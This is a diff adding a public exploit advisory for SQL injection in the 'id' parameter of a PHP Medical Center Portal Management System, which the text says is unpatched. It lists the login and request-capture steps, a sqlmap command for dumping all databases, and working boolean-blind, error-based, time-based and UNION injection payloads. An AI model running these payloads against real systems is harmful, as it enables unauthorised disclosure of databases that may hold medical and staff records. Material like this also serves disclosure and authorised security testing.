@@ -1,0 +1,52 @@
+# Exploit Title: Medical Center Portal Management System 1.0 - 'id' SQL Injection
+# Exploit Author: Saeed Bala Ahmed (r0b0tG4nG)
+# Date: 2020-12-10
+# Google Dork: N/A
+# Vendor Homepage: https://www.sourcecodester.com/php/14594/medical-center-portal-management-system.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=14594&title=Medical+Center+Portal+Management+System+using+PHP%2FMySQLi
+# Affected Version: Version 1
+# Patched Version: Unpatched
+# Category: Web Application
+# Tested on: Parrot OS
+
+Step 1. Login to the application with any verified user credentials
+
+Step 2. Select Staff and select the view icon.
+
+Step 3. You will be redirected to a page like "
+http://localhost/pages/emp_searchfrm.php?action=edit & id=1". Or visit any
+page that has the "id" parameter. Capture the current page request in
+burpsuite
+
+Step 4. Save request and run sqlmap on request file using command " sqlmap
+-r request -p id --time-sec=5 --dbs ".
+
+Step 5. This will inject successfully and you will have an information
+disclosure of all databases contents.
+
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: action=edit & id=(SELECT (CASE WHEN (7289=7289) THEN 22 ELSE
+(SELECT 4035 UNION SELECT 6415) END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP
+BY clause (FLOOR)
+    Payload: action=edit & id=22 AND (SELECT 9743 FROM(SELECT
+COUNT(*),CONCAT(0x716b6a7871,(SELECT
+(ELT(9743=9743,1))),0x71706b7071,FLOOR(RAND(0)*2))x FROM
+INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: action=edit & id=22 AND (SELECT 4861 FROM
+(SELECT(SLEEP(5)))xiXm)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 9 columns
+    Payload: action=edit & id=22 UNION ALL SELECT
+NULL,NULL,NULL,NULL,CONCAT(0x716b6a7871,0x4b445769664f765073644975666f6e50615968654f6b626259447767746c67516949686365597672,0x71706b7071),NULL,NULL,NULL,NULL--
+-
+---
